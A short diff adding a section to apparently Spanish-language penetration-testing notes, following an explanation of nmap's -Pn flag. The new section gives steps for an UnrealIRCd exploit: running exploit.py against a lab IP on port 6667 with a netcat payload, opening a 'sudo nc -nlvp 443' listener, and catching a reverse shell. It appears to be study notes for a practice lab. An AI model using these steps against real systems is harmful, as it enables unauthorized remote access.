@@ -105,6 +105,20 @@ Donde:
 
 `-Pn`: No pide ping
 
+### exploit.py
+Put the ip add of the host in the exploit.py file (UnrealIRcd)
+```bash
+./exploit.py 192.168.1.8 6667 -payload netcat # victim's ip and port
+```
+- In another console, open netcat
+```
+sudo nc -nlvp 443
+```
+- Run the py script and get the reverse shell
+
+
+
+
 
 
 
